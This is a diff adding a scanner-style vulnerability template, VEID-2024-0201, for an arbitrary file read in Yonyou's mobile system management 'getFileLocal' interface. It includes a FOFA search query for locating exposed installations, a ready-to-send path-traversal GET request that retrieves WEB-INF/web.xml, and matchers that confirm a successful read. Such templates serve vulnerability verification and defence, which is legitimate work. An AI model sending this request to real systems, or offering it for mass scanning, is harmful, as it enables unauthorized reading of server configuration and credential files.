@@ -1,0 +1,24 @@
+## id: VEID-2024-0201
+## name: 用友移动系统管理getFileLocal接口存在任意文件读取
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description:用友移动系统管理存在任意文件读取。
+## fofa-query: app="用友-移动系统管理"
+## verification: true
+
+
+GET /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "version=" && body contains "attachment; filename"
+
+
+
+
+
+# @VEIL-STAMP: 65a5b81e7b8a0d27df190646e418ced2ce12b73fdad4be7fe4ce335f13d86a0b
